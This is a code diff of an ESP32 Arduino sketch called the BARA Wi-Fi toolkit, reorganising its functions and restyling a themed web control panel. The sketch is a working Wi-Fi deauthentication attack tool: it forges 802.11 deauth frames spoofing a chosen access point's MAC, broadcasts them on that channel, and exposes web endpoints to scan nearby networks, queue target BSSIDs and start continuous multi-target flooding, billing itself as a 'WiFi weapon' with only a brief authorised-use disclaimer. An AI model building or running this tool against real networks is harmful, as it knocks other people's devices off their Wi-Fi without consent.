@@ -1,8 +1,8 @@
 // ============================================================================
-// 🩸 B A R A – A D V A N C E D  W I - F I  T O O L K I T  F O R  E S P 3 2 🩸
+// 🩸 B A R A — A D V A N C E D  W I - F I  T O O L K I T  F O R  E S P 3 2 🩸
 // ============================================================================
 // Developed by: Ahmed Nour Ahmed | Qena, Egypt
-// Version: 3.0 ULTIMATE EDITION (FIXED)
+// Version: 3.0 ULTIMATE EDITION
 // Purpose: Professional Wi-Fi penetration testing & network reconnaissance
 // Features: Multi-channel deauth, live scanning, captive portal, epic UI
 // ============================================================================
@@ -65,6 +65,219 @@ struct SystemMetrics {
     uint32_t totalDeauthPackets;
 } metrics;
 
+// ==================== 📝 LOGGING FUNCTION ====================
+void addLog(String message) {
+    Serial.println("[BARA] " + message);
+}
+
+// ==================== 📡 DEAUTH PACKET STRUCTURE ====================
+void sendDeauthFrame(const uint8_t* targetMAC, uint8_t channel) {
+    // Set WiFi channel for transmission
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    
+    // IEEE 802.11 Deauthentication frame
+    uint8_t deauthPacket[26] = {
+        0xC0, 0x00,                         // Type/Subtype: Deauthentication
+        0x3A, 0x01,                         // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
+        targetMAC[0], targetMAC[1], targetMAC[2],
+        targetMAC[3], targetMAC[4], targetMAC[5], // Source: Target AP
+        targetMAC[0], targetMAC[1], targetMAC[2],
+        targetMAC[3], targetMAC[4], targetMAC[5], // BSSID: Target AP
+        0x00, 0x00,                         // Fragment & Sequence
+        0x07, 0x00                          // Reason: Class 3 frame from non-associated STA
+    };
+    
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+    totalPacketsSent++;
+}
+
+// ==================== 📡 ENHANCED WIFI SCAN ====================
+String performWiFiScan() {
+    if (scanInProgress) {
+        return "{\"error\": \"Scan already in progress\"}";
+    }
+    
+    scanInProgress = true;
+    addLog("Starting WiFi scan...");
+    
+    WiFi.mode(WIFI_AP_STA);
+    int networksFound = WiFi.scanNetworks(false, true, false, 300);
+    
+    scannedCount = (networksFound > MAX_NETWORKS) ? MAX_NETWORKS : (networksFound > 0 ? networksFound : 0);
+    
+    DynamicJsonDocument doc(8192);
+    JsonArray networks = doc.to<JsonArray>();
+    
+    for (int i = 0; i < scannedCount; i++) {
+        JsonObject net = networks.createNestedObject();
+        net["bssid"] = WiFi.BSSIDstr(i);
+        net["ssid"] = WiFi.SSID(i);
+        net["rssi"] = WiFi.RSSI(i);
+        net["channel"] = WiFi.channel(i);
+        net["encryption"] = WiFi.encryptionType(i);
+    }
+    
+    String jsonOutput;
+    serializeJson(doc, jsonOutput);
+    
+    WiFi.mode(WIFI_AP);
+    scanInProgress = false;
+    metrics.totalScans++;
+    lastScanTime = millis();
+    
+    addLog("Scan complete: " + String(scannedCount) + " networks");
+    return jsonOutput;
+}
+
+// ==================== 🌐 WEB SERVER HANDLERS ====================
+void setupWebInterface() {
+    // Main page
+    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
+        request->send_P(200, "text/html", index_html);
+    });
+    
+    // Network scan endpoint
+    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request) {
+        String scanResults = performWiFiScan();
+        request->send(200, "application/json", scanResults);
+    });
+    
+    // Add deauth target
+    server.on("/addtarget", HTTP_GET, [](AsyncWebServerRequest *request) {
+        if (!request->hasParam("bssid") || !request->hasParam("channel")) {
+            request->send(400, "text/plain", "Missing parameters");
+            return;
+        }
+        
+        String bssid = request->getParam("bssid")->value();
+        uint8_t channel = request->getParam("channel")->value().toInt();
+        uint16_t interval = request->hasParam("interval") ? 
+            request->getParam("interval")->value().toInt() : 100;
+        
+        // Find empty slot
+        int slot = -1;
+        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
+            if (!deauthTargets[i].active) {
+                slot = i;
+                break;
+            }
+        }
+        
+        if (slot == -1) {
+            request->send(400, "text/plain", "Maximum targets reached");
+            return;
+        }
+        
+        // Parse MAC address
+        int parsed = sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+            &deauthTargets[slot].mac[0], &deauthTargets[slot].mac[1],
+            &deauthTargets[slot].mac[2], &deauthTargets[slot].mac[3],
+            &deauthTargets[slot].mac[4], &deauthTargets[slot].mac[5]);
+        
+        if (parsed != 6) {
+            request->send(400, "text/plain", "Invalid BSSID format");
+            return;
+        }
+        
+        deauthTargets[slot].bssid = bssid;
+        deauthTargets[slot].channel = channel;
+        deauthTargets[slot].active = false;
+        deauthTargets[slot].packetCount = 0;
+        deauthTargets[slot].lastSent = 0;
+        
+        globalDeauthInterval = interval;
+        
+        addLog("Added target: " + bssid + " on channel " + String(channel));
+        request->send(200, "text/plain", "Target added successfully: " + bssid);
+    });
+    
+    // Start deauth attacks
+    server.on("/startdeauth", HTTP_GET, [](AsyncWebServerRequest *request) {
+        int activeCount = 0;
+        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
+            if (deauthTargets[i].bssid.length() > 0) {
+                deauthTargets[i].active = true;
+                activeCount++;
+            }
+        }
+        
+        if (activeCount == 0) {
+            request->send(400, "text/plain", "No targets configured");
+            return;
+        }
+        
+        deauthGlobalActive = true;
+        addLog("DEAUTH ATTACK STARTED - " + String(activeCount) + " targets");
+        request->send(200, "text/plain", 
+            "Deauth attack started on " + String(activeCount) + " target(s)");
+    });
+    
+    // Stop deauth attacks
+    server.on("/stopdeauth", HTTP_GET, [](AsyncWebServerRequest *request) {
+        deauthGlobalActive = false;
+        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
+            deauthTargets[i].active = false;
+        }
+        addLog("All deauth attacks stopped");
+        request->send(200, "text/plain", "All deauth attacks stopped");
+    });
+    
+    // Remove target
+    server.on("/removetarget", HTTP_GET, [](AsyncWebServerRequest *request) {
+        if (!request->hasParam("bssid")) {
+            request->send(400, "text/plain", "BSSID parameter required");
+            return;
+        }
+        
+        String bssid = request->getParam("bssid")->value();
+        bool found = false;
+        
+        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
+            if (deauthTargets[i].bssid == bssid) {
+                deauthTargets[i].bssid = "";
+                deauthTargets[i].active = false;
+                deauthTargets[i].packetCount = 0;
+                found = true;
+                break;
+            }
+        }
+        
+        if (found) {
+            addLog("Removed target: " + bssid);
+            request->send(200, "text/plain", "Target removed: " + bssid);
+        } else {
+            request->send(404, "text/plain", "Target not found");
+        }
+    });
+    
+    // System metrics
+    server.on("/metrics", HTTP_GET, [](AsyncWebServerRequest *request) {
+        DynamicJsonDocument doc(2048);
+        doc["uptime"] = millis() / 1000;
+        doc["freeHeap"] = ESP.getFreeHeap();
+        doc["cpuFreq"] = ESP.getCpuFreqMHz();
+        doc["totalScans"] = metrics.totalScans;
+        doc["totalDeauthPackets"] = totalPacketsSent;
+        
+        JsonArray targets = doc.createNestedArray("targets");
+        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
+            if (deauthTargets[i].bssid.length() > 0) {
+                JsonObject target = targets.createNestedObject();
+                target["bssid"] = deauthTargets[i].bssid;
+                target["packets"] = deauthTargets[i].packetCount;
+                target["active"] = deauthTargets[i].active;
+            }
+        }
+        
+        String jsonOutput;
+        serializeJson(doc, jsonOutput);
+        request->send(200, "application/json", jsonOutput);
+    });
+    
+    server.begin();
+}
+
 // ==================== 🌐 EPIC BLOOD-HACKER HTML INTERFACE ====================
 const char index_html[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
@@ -126,24 +339,6 @@ const char index_html[] PROGMEM = R"rawliteral(
             100% { top: 100%; }
         }
         
-        @keyframes shine {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateX(-20px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        @keyframes visualize {
-            to { height: 100%; }
-        }
-        
         body {
             background: var(--dark-bg);
             color: var(--blood-red);
@@ -153,6 +348,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             min-height: 100vh;
         }
         
+        /* Matrix Rain Background */
         .matrix-bg {
             position: fixed;
             top: 0;
@@ -174,6 +370,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             text-shadow: 0 0 5px var(--matrix-green);
         }
         
+        /* Scanline Effect */
         .scanline {
             position: fixed;
             top: 0;
@@ -187,6 +384,16 @@ const char index_html[] PROGMEM = R"rawliteral(
             opacity: 0.3;
         }
         
+        /* Blood Drops */
+        .blood-drop {
+            position: fixed;
+            background: radial-gradient(circle, rgba(255,0,0,0.8) 0%, transparent 70%);
+            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
+            pointer-events: none;
+            z-index: 2;
+        }
+        
+        /* Container */
         .container {
             position: relative;
             max-width: 1400px;
@@ -195,6 +402,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             z-index: 10;
         }
         
+        /* Header */
         header {
             text-align: center;
             margin: 30px 0 40px;
@@ -241,6 +449,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             text-shadow: 0 0 5px var(--matrix-green);
         }
         
+        /* Cards */
         .card {
             background: var(--card-bg);
             border: 2px solid var(--blood-red);
@@ -271,6 +480,11 @@ const char index_html[] PROGMEM = R"rawliteral(
             animation: shine 6s infinite;
         }
         
+        @keyframes shine {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
         .card h2 {
             color: var(--neon-red);
             margin-bottom: 20px;
@@ -283,6 +497,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             z-index: 1;
         }
         
+        /* Grid Layout */
         .grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
@@ -290,6 +505,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             margin: 20px 0;
         }
         
+        /* Status Bar */
         .status-bar {
             padding: 15px;
             margin: 20px 0;
@@ -308,6 +524,7 @@ const char index_html[] PROGMEM = R"rawliteral(
         .status-scanning { color: var(--matrix-green); border-color: var(--matrix-green); }
         .status-attacking { color: var(--blood-red); border-color: var(--blood-red); animation: glitch 0.3s infinite; }
         
+        /* Buttons */
         .btn {
             background: linear-gradient(135deg, var(--blood-red), var(--blood-dark));
             color: white;
@@ -364,6 +581,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             background: linear-gradient(135deg, #666, #444);
         }
         
+        /* Input */
         input[type="text"], input[type="number"], select {
             padding: 14px;
             background: rgba(0, 0, 0, 0.9);
@@ -384,6 +602,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             box-shadow: 0 0 25px rgba(191, 0, 255, 0.6);
         }
         
+        /* Table */
         .table-container {
             overflow-x: auto;
             position: relative;
@@ -425,6 +644,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             transform: scale(1.01);
         }
         
+        /* Signal Strength */
         .signal {
             display: inline-flex;
             gap: 2px;
@@ -438,6 +658,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             box-shadow: 0 0 5px var(--matrix-green);
         }
         
+        /* Encryption Badge */
         .enc-badge {
             padding: 4px 10px;
             border-radius: 5px;
@@ -451,6 +672,7 @@ const char index_html[] PROGMEM = R"rawliteral(
         .enc-wpa { background: #ffaa00; color: black; }
         .enc-wpa2 { background: #44ff44; color: black; }
         
+        /* Log Console */
         .log-console {
             height: 300px;
             overflow-y: auto;
@@ -485,12 +707,18 @@ const char index_html[] PROGMEM = R"rawliteral(
             animation: slideIn 0.3s;
         }
         
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        
         .log-success { color: #55ff55; border-left-color: #55ff55; }
         .log-error { color: #ff4444; border-left-color: #ff4444; }
         .log-warning { color: #ffaa44; border-left-color: #ffaa44; }
         .log-info { color: #aaaaff; border-left-color: #aaaaff; }
         .log-attack { color: var(--blood-red); border-left-color: var(--blood-red); font-weight: bold; }
         
+        /* Metrics Grid */
         .metrics {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -524,6 +752,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             letter-spacing: 1px;
         }
         
+        /* Target List */
         .target-list {
             max-height: 250px;
             overflow-y: auto;
@@ -563,6 +792,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             margin-top: 5px;
         }
         
+        /* Footer */
         footer {
             text-align: center;
             margin: 50px 0 30px;
@@ -573,6 +803,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             z-index: 1;
         }
         
+        /* Loading Spinner */
         .spinner {
             display: inline-block;
             width: 20px;
@@ -583,6 +814,11 @@ const char index_html[] PROGMEM = R"rawliteral(
             animation: spin 1s linear infinite;
         }
         
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Audio Visualizer */
         .audio-viz {
             display: flex;
             gap: 3px;
@@ -599,6 +835,10 @@ const char index_html[] PROGMEM = R"rawliteral(
             animation: visualize 0.8s ease-in-out infinite alternate;
         }
         
+        @keyframes visualize {
+            to { height: 100%; }
+        }
+        
         .viz-bar:nth-child(1) { animation-delay: 0s; height: 20%; }
         .viz-bar:nth-child(2) { animation-delay: 0.1s; height: 40%; }
         .viz-bar:nth-child(3) { animation-delay: 0.2s; height: 60%; }
@@ -607,6 +847,7 @@ const char index_html[] PROGMEM = R"rawliteral(
         .viz-bar:nth-child(6) { animation-delay: 0.5s; height: 40%; }
         .viz-bar:nth-child(7) { animation-delay: 0.6s; height: 20%; }
         
+        /* Responsive */
         @media (max-width: 768px) {
             .container { padding: 10px; }
             h1 { font-size: 2.8em; }
@@ -618,14 +859,18 @@ const char index_html[] PROGMEM = R"rawliteral(
     </style>
 </head>
 <body>
+    <!-- Matrix Background -->
     <div class="matrix-bg" id="matrixBg"></div>
+    
+    <!-- Scanline Effect -->
     <div class="scanline"></div>
     
     <div class="container">
+        <!-- Header -->
         <header>
             <h1>BARA TOOLKIT</h1>
             <div class="subtitle">Advanced WiFi Penetration Testing System</div>
-            <div class="version">v3.0 ULTIMATE FIXED | Developed by Ahmed Nour Ahmed | Qena, Egypt</div>
+            <div class="version">v3.0 ULTIMATE | Developed by Ahmed Nour Ahmed | Qena, Egypt</div>
             <div class="audio-viz">
                 <div class="viz-bar"></div>
                 <div class="viz-bar"></div>
@@ -637,6 +882,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             </div>
         </header>
 
+        <!-- System Status -->
         <div class="card">
             <h2>⚡ SYSTEM STATUS</h2>
             <div id="status" class="status-bar status-idle">Initializing...</div>
@@ -661,12 +907,13 @@ const char index_html[] PROGMEM = R"rawliteral(
             </div>
         </div>
 
+        <!-- Control Panel -->
         <div class="card">
             <h2>🎮 CONTROL PANEL</h2>
             <div style="text-align: center;">
                 <button class="btn" onclick="scanNetworks()">🔍 SCAN NETWORKS</button>
                 <button class="btn" onclick="toggleDeauthPanel()">⚔️ ATTACK MODE</button>
-                <button class="btn btn-stop" onclick="stopAllAttacks()">⛔ EMERGENCY STOP</button>
+                <button class="btn btn-stop" onclick="stopAllAttacks()">⏹ EMERGENCY STOP</button>
                 <button class="btn" onclick="clearLogs()">🗑️ CLEAR LOGS</button>
             </div>
             
@@ -699,6 +946,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             </div>
         </div>
 
+        <!-- Network Scanner -->
         <div class="card">
             <h2>📡 NETWORK SCANNER (<span id="netCount">0</span> detected)</h2>
             <div class="table-container">
@@ -722,27 +970,20 @@ const char index_html[] PROGMEM = R"rawliteral(
             </div>
         </div>
 
+        <!-- Attack Logs -->
         <div class="card">
             <h2>🩸 ATTACK LOGS & SYSTEM EVENTS</h2>
             <div class="log-console" id="logConsole"></div>
         </div>
 
         <footer>
-            🩸 BARA v3.0 FIXED – THE ULTIMATE ESP32 WIFI WEAPON 🩸<br>
+            🩸 BARA v3.0 — THE ULTIMATE ESP32 WIFI WEAPON 🩸<br>
             <small>For Authorized Security Testing Only | Unauthorized Use is Illegal</small>
         </footer>
     </div>
 
     <script>
-        // In-memory state management (NO localStorage)
-        let appState = {
-            logs: [],
-            activeTargets: [],
-            scanning: false
-        };
-        
-        const MAX_LOGS = 200;
-        
+        // ==================== AUDIO SYSTEM ====================
         const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         
         function playTone(freq, duration, type = 'sine') {
@@ -777,6 +1018,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             playTone(200, 0.3, 'sawtooth');
         }
         
+        // ==================== MATRIX RAIN EFFECT ====================
         function createMatrixRain() {
             const matrixBg = document.getElementById('matrixBg');
             const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
@@ -798,12 +1040,35 @@ const char index_html[] PROGMEM = R"rawliteral(
             }
         }
         
+        // ==================== BLOOD DROP EFFECT ====================
+        function createBloodDrop() {
+            const drop = document.createElement('div');
+            drop.className = 'blood-drop';
+            drop.style.left = Math.random() * 100 + 'vw';
+            drop.style.width = (Math.random() * 30 + 20) + 'px';
+            drop.style.height = drop.style.width;
+            drop.style.top = '-50px';
+            drop.style.animation = `fall ${Math.random() * 5 + 8}s linear`;
+            document.body.appendChild(drop);
+            
+            setTimeout(() => drop.remove(), 15000);
+        }
+        
+        setInterval(() => {
+            if (Math.random() > 0.6) createBloodDrop();
+        }, 800);
+        
+        // ==================== LOG SYSTEM ====================
+        const logs = [];
+        const MAX_LOGS = 200;
+        
         function addLog(message, type = 'info') {
             const timestamp = new Date().toLocaleTimeString();
-            appState.logs.push({ time: timestamp, msg: message, type: type });
-            if (appState.logs.length > MAX_LOGS) appState.logs.shift();
+            logs.push({ time: timestamp, msg: message, type: type });
+            if (logs.length > MAX_LOGS) logs.shift();
             renderLogs();
             
+            // Play sound based on type
             if (type === 'attack') playAttackSound();
             else if (type === 'success') playSuccessSound();
             else if (type === 'error') playErrorSound();
@@ -811,31 +1076,35 @@ const char index_html[] PROGMEM = R"rawliteral(
         
         function renderLogs() {
             const console = document.getElementById('logConsole');
-            console.innerHTML = appState.logs.map(l => 
+            console.innerHTML = logs.map(l => 
                 `<div class="log-entry log-${l.type}">[${l.time}] ${l.msg}</div>`
             ).join('');
             console.scrollTop = console.scrollHeight;
         }
         
         function clearLogs() {
-            appState.logs = [];
+            logs.length = 0;
             renderLogs();
             addLog('Logs cleared', 'info');
         }
         
+        // ==================== STATUS MANAGEMENT ====================
         function updateStatus(message, statusClass = 'status-idle') {
             const statusEl = document.getElementById('status');
             statusEl.textContent = message;
             statusEl.className = 'status-bar ' + statusClass;
         }
         
+        // ==================== NETWORK SCANNING ====================
+        let scanning = false;
+        
         async function scanNetworks() {
-            if (appState.scanning) {
+            if (scanning) {
                 addLog('Scan already in progress!', 'warning');
                 return;
             }
             
-            appState.scanning = true;
+            scanning = true;
             updateStatus('🔍 SCANNING NETWORKS... PLEASE WAIT', 'status-scanning');
             addLog('Starting network scan...', 'info');
             playScanSound();
@@ -844,7 +1113,7 @@ const char index_html[] PROGMEM = R"rawliteral(
                 const response = await fetch('/scan');
                 const networks = await response.json();
                 renderNetworks(networks);
-                updateStatus(`✅ SCAN COMPLETE – ${networks.length} NETWORKS DETECTED`, 'status-idle');
+                updateStatus(`✅ SCAN COMPLETE — ${networks.length} NETWORKS DETECTED`, 'status-idle');
                 addLog(`Scan complete: ${networks.length} networks found`, 'success');
                 playSuccessSound();
             } catch (error) {
@@ -852,7 +1121,7 @@ const char index_html[] PROGMEM = R"rawliteral(
                 addLog('Scan error: ' + error.message, 'error');
                 playErrorSound();
             } finally {
-                appState.scanning = false;
+                scanning = false;
             }
         }
         
@@ -870,24 +1139,30 @@ const char index_html[] PROGMEM = R"rawliteral(
             networks.forEach(net => {
                 const row = tbody.insertRow();
                 
+                // BSSID
                 const bssidCell = row.insertCell();
                 bssidCell.textContent = net.bssid;
                 bssidCell.style.fontWeight = 'bold';
                 
+                // SSID
                 const ssidCell = row.insertCell();
                 ssidCell.textContent = net.ssid || '⚠️ HIDDEN';
                 ssidCell.style.color = net.ssid ? '#ffaaaa' : '#ff6666';
                 
+                // Signal Strength
                 const signalCell = row.insertCell();
                 const signalBars = getSignalBars(net.rssi);
                 signalCell.innerHTML = `<div class="signal">${signalBars}</div> ${net.rssi} dBm`;
                 
+                // Channel
                 const channelCell = row.insertCell();
                 channelCell.textContent = net.channel;
                 
+                // Encryption
                 const encCell = row.insertCell();
                 encCell.innerHTML = getEncryptionBadge(net.encryption);
                 
+                // Action
                 const actionCell = row.insertCell();
                 const btn = document.createElement('button');
                 btn.className = 'btn';
@@ -930,6 +1205,9 @@ const char index_html[] PROGMEM = R"rawliteral(
             playTone(600, 0.1);
         }
         
+        // ==================== DEAUTH ATTACK MANAGEMENT ====================
+        let activeTargets = [];
+        
         function toggleDeauthPanel() {
             const panel = document.getElementById('deauthPanel');
             panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
@@ -941,19 +1219,22 @@ const char index_html[] PROGMEM = R"rawliteral(
             const channel = parseInt(document.getElementById('targetChannel').value);
             const interval = parseInt(document.getElementById('attackInterval').value);
             
+            // Validate BSSID
             if (!bssid || !/^[0-9A-F]{2}(:[0-9A-F]{2}){5}$/.test(bssid)) {
                 alert('⚠️ Invalid BSSID format! Use AA:BB:CC:DD:EE:FF');
                 playErrorSound();
                 return;
             }
             
+            // Validate Channel
             if (!channel || channel < 1 || channel > 13) {
                 alert('⚠️ Invalid channel! Must be 1-13');
                 playErrorSound();
                 return;
             }
             
-            if (appState.activeTargets.find(t => t.bssid === bssid)) {
+            // Check if target already exists
+            if (activeTargets.find(t => t.bssid === bssid)) {
                 addLog(`Target ${bssid} already in list`, 'warning');
                 return;
             }
@@ -962,11 +1243,12 @@ const char index_html[] PROGMEM = R"rawliteral(
                 const response = await fetch(`/addtarget?bssid=${encodeURIComponent(bssid)}&channel=${channel}&interval=${interval}`);
                 const result = await response.text();
                 
-                appState.activeTargets.push({ bssid, channel, packets: 0, active: false });
+                activeTargets.push({ bssid, channel, packets: 0, active: false });
                 renderTargets();
                 addLog(result, 'success');
                 playSuccessSound();
                 
+                // Clear inputs
                 document.getElementById('targetBssid').value = '';
                 document.getElementById('targetChannel').value = '';
             } catch (error) {
@@ -976,7 +1258,7 @@ const char index_html[] PROGMEM = R"rawliteral(
         }
         
         async function startAllAttacks() {
-            if (appState.activeTargets.length === 0) {
+            if (activeTargets.length === 0) {
                 alert('⚠️ No targets configured!');
                 playErrorSound();
                 return;
@@ -985,9 +1267,9 @@ const char index_html[] PROGMEM = R"rawliteral(
             try {
                 const response = await fetch('/startdeauth');
                 const result = await response.text();
-                updateStatus('🔥 DEAUTH ATTACKS ACTIVE – MULTIPLE TARGETS', 'status-attacking');
+                updateStatus('🔥 DEAUTH ATTACKS ACTIVE — MULTIPLE TARGETS', 'status-attacking');
                 addLog(result, 'attack');
-                appState.activeTargets.forEach(t => t.active = true);
+                activeTargets.forEach(t => t.active = true);
                 renderTargets();
                 playAttackSound();
             } catch (error) {
@@ -1002,7 +1284,7 @@ const char index_html[] PROGMEM = R"rawliteral(
                 const result = await response.text();
                 updateStatus('✅ ALL ATTACKS STOPPED', 'status-idle');
                 addLog(result, 'success');
-                appState.activeTargets.forEach(t => t.active = false);
+                activeTargets.forEach(t => t.active = false);
                 renderTargets();
                 playSuccessSound();
             } catch (error) {
@@ -1014,7 +1296,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             try {
                 const response = await fetch(`/removetarget?bssid=${encodeURIComponent(bssid)}`);
                 const result = await response.text();
-                appState.activeTargets = appState.activeTargets.filter(t => t.bssid !== bssid);
+                activeTargets = activeTargets.filter(t => t.bssid !== bssid);
                 renderTargets();
                 addLog(result, 'info');
                 playTone(400, 0.1);
@@ -1026,12 +1308,12 @@ const char index_html[] PROGMEM = R"rawliteral(
         function renderTargets() {
             const listEl = document.getElementById('targetList');
             
-            if (appState.activeTargets.length === 0) {
+            if (activeTargets.length === 0) {
                 listEl.innerHTML = '<div style="text-align:center; color:#666;">No active targets</div>';
                 return;
             }
             
-            listEl.innerHTML = appState.activeTargets.map(target => `
+            listEl.innerHTML = activeTargets.map(target => `
                 <div class="target-item">
                     <div class="target-info">
                         <div class="target-bssid">${target.bssid}</div>
@@ -1046,6 +1328,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             `).join('');
         }
         
+        // ==================== METRICS UPDATE ====================
         async function updateMetrics() {
             try {
                 const response = await fetch('/metrics');
@@ -1056,6 +1339,7 @@ const char index_html[] PROGMEM = R"rawliteral(
                 document.getElementById('totalScans').textContent = data.totalScans;
                 document.getElementById('totalPackets').textContent = data.totalDeauthPackets.toLocaleString();
                 
+                // Update target packet counts
                 if (data.targets) {
                     data.targets.forEach(target => {
                         const el = document.getElementById('pkt-' + target.bssid.replace(/:/g, ''));
@@ -1063,7 +1347,7 @@ const char index_html[] PROGMEM = R"rawliteral(
                     });
                 }
             } catch (error) {
-                // Silent fail
+                // Silent fail for metrics
             }
         }
         
@@ -1076,17 +1360,19 @@ const char index_html[] PROGMEM = R"rawliteral(
             return `${s}s`;
         }
         
+        // ==================== INITIALIZATION ====================
         window.addEventListener('load', () => {
             createMatrixRain();
-            addLog('🩸 BARA TOOLKIT v3.0 FIXED INITIALIZED', 'success');
+            addLog('🩸 BARA TOOLKIT v3.0 INITIALIZED', 'success');
             addLog('System ready for WiFi penetration testing', 'info');
             addLog('Developed by Ahmed Nour Ahmed | Qena, Egypt', 'info');
-            updateStatus('✅ HOTSPOT ACTIVE – CONNECT TO "BARA_HACKING_PORTAL"', 'status-idle');
+            updateStatus('✅ HOTSPOT ACTIVE — CONNECT TO "BARA_HACKING_PORTAL"', 'status-idle');
             playSuccessSound();
             
+            // Start periodic updates
             setInterval(updateMetrics, 2000);
             setInterval(() => {
-                if (appState.activeTargets.some(t => t.active)) {
+                if (activeTargets.some(t => t.active)) {
                     const msgs = [
                         '⚡ Packets flooding target network...',
                         '🔥 Deauth frames transmitted successfully',
@@ -1104,230 +1390,38 @@ const char index_html[] PROGMEM = R"rawliteral(
 </html>
 )rawliteral";
 
-void sendDeauthFrame(const uint8_t* targetMAC, uint8_t channel) {
-    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-    
-    uint8_t deauthPacket[26] = {
-        0xC0, 0x00,
-        0x3A, 0x01,
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-        targetMAC[0], targetMAC[1], targetMAC[2],
-        targetMAC[3], targetMAC[4], targetMAC[5],
-        targetMAC[0], targetMAC[1], targetMAC[2],
-        targetMAC[3], targetMAC[4], targetMAC[5],
-        0x00, 0x00,
-        0x07, 0x00
-    };
-    
-    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
-    totalPacketsSent++;
-}
-
-String performWiFiScan() {
-    if (scanInProgress) {
-        return "{\"error\": \"Scan already in progress\"}";
-    }
-    
-    scanInProgress = true;
-    addLog("Starting WiFi scan...");
-    
-    WiFi.mode(WIFI_AP_STA);
-    int networksFound = WiFi.scanNetworks(false, true, false, 300);
-    
-    scannedCount = (networksFound > MAX_NETWORKS) ? MAX_NETWORKS : (networksFound > 0 ? networksFound : 0);
-    
-    DynamicJsonDocument doc(8192);
-    JsonArray networks = doc.to<JsonArray>();
-    
-    for (int i = 0; i < scannedCount; i++) {
-        JsonObject net = networks.createNestedObject();
-        net["bssid"] = WiFi.BSSIDstr(i);
-        net["ssid"] = WiFi.SSID(i);
-        net["rssi"] = WiFi.RSSI(i);
-        net["channel"] = WiFi.channel(i);
-        net["encryption"] = WiFi.encryptionType(i);
-    }
-    
-    String jsonOutput;
-    serializeJson(doc, jsonOutput);
-    
-    WiFi.mode(WIFI_AP);
-    scanInProgress = false;
-    metrics.totalScans++;
-    lastScanTime = millis();
-    
-    addLog("Scan complete: " + String(scannedCount) + " networks");
-    return jsonOutput;
-}
-
-void setupWebInterface() {
-    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
-        request->send_P(200, "text/html", index_html);
-    });
-    
-    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request) {
-        String scanResults = performWiFiScan();
-        request->send(200, "application/json", scanResults);
-    });
-    
-    server.on("/addtarget", HTTP_GET, [](AsyncWebServerRequest *request) {
-        if (!request->hasParam("bssid") || !request->hasParam("channel")) {
-            request->send(400, "text/plain", "Missing parameters");
-            return;
-        }
-        
-        String bssid = request->getParam("bssid")->value();
-        uint8_t channel = request->getParam("channel")->value().toInt();
-        uint16_t interval = request->hasParam("interval") ? 
-            request->getParam("interval")->value().toInt() : 100;
-        
-        int slot = -1;
-        for (int i = 0; i < MAX_DEAUTH_TARGETS; i++) {
-            if (!deauthTargets[i].active) {
-                slot = i;
-                break;
-            }
-        }
-        
-        if (slot == -1) {
-            request->send(400, "text/plain", "Maximum targets reached");
-            return;
-        }
-        
-        int parsed = sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-            &deauthTargets[slot].mac[0], &deauthTargets[slot].mac[1],
-            &deauthTargets[slot].mac[2], &deauthTargets[slot].mac[3],
-            &deauthTargets[slot].mac[4], &deauthTargets[slot].mac[5]);
-        
-        if (parsed != 6) {
-            request->send(400, "text/plain", "Invalid BSSID format");
-            return;
-        }
-        
-        deauthTargets[slot].bssid = bssid;
-        deauthTargets[slot].channel = channel;
-        deauthTargets[slot].active = false;
-        deauthTargets[slot].packetCount = 0;
-        deauthTargets[slot].lastSent = 0;
-        
-        globalDeauthInterval = interval;
-        
-        addLog("Added target: " + bssid + " on channel " + String(channel));
